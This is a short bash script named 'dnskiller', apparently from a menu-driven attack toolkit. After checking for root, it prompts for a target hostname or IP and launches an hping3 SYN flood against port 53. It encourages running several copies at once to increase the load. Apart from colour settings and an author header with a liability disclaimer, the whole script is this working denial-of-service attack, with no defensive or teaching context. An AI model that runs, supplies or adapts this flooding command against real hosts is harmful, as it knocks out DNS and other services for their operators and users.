#!/bin/bash
#####################################################################################################################
# 														    #
# 					This script is written by Cosbysweater					    #
# This program is open source; you can redistribute it and/or modify it under the terms of the GNU General Public   #
# 			The author bears no responsibility for malicious or illegal use. 			    #
# 														    #
# 														    #
#####################################################################################################################

#########################################################################################
# 					known bugs 					#
# 					None so far 					#
# 			Please report bugs to love@dufva.guru				#
#########################################################################################

# ~~~~~~~~~~ Environment Setup ~~~~~~~~~~ #
  NORMAL=`echo "\033[m"`
  BLUE=`echo "\033[36m"` #Blue
  NUMBER=`echo "\033[33m"` #yellow
  FGRED=`echo "\033[41m"`
  RED_TEXT=`echo "\033[31m"` #Red
  ENTER_LINE=`echo "\033[33m"`
  INTRO_TEXT=`echo "\033[32m"` #green and white text
  INFOS=`echo "\033[103;30m"` #yellow bg
  SUCCESS=`echo "\033[102;30m"` #green bg
  WARNING=`echo "\033[101;30m"` #red bg
  WARP=`echo "\033[106;30m"` #lightblue bg
  BLACK=`echo "\033[109;30m"` #SPACE bg
  END=`echo "\033[0m"`
# ~~~~~~~~~~ Environment Setup ~~~~~~~~~~ #
#info
ver=$(echo dnskiller_1.0)
#Author Love "Cosbysweater" Dufva

#################################Start script and validation####################################
#Init
FILE="/tmp/out.$$"
GREP="/bin/grep"
#Only root should run this.
if [[ $EUID -ne 0 ]]; then
	echo -e "${WARNING}Run as root.${END}" 1>&2
	exit 1
fi

echo -e "${ENTER_LINE}Hostname/IP?${END}"
read host
echo -e "${BLUE}Starting dnskiller. You can run several by opening the menu in more terminal windows and starting it from there.${END}"
hping3 -S -p 53 $host --flood 
read -r -p "Do you want to go back to the Main menu? [y/N] " response
case $response in
[yY][eE][sS]|[yY])
        bash FikaSec
;;
    *)
        :
;;
esac
